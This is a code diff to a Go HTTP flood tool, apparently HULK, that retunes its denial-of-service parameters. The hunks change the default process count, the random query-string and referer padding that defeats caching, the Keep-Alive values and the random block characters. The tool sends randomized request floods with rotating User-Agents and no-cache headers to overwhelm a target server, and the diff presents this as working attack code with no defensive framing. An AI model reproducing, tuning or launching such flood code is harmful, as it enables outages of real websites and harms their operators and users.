@@ -94,7 +94,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 700000
+		maxproc = 70000
 	}
 
 	u, err := url.Parse(site)
@@ -178,7 +178,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		var err error
 
 		if data == "" {
-			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(35)+15)+"="+buildblock(rand.Intn(35)+15), nil)
+			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
 		} else {
 			q, err = http.NewRequest("POST", url, strings.NewReader(data))
 		}
@@ -191,8 +191,8 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
 		q.Header.Set("Cache-Control", "no-cache")
 		q.Header.Set("Accept-Charset", acceptCharset)
-		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(100)+100))
-		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000)+10000))
+		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
+		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(100)+1000))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
 
@@ -226,7 +226,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 func buildblock(size int) (s string) {
 	var a []rune
 	for i := 0; i < size; i++ {
-		a = append(a, rune(rand.Intn(55)+95))
+		a = append(a, rune(rand.Intn(25)+65))
 	}
 	return string(a)
 }
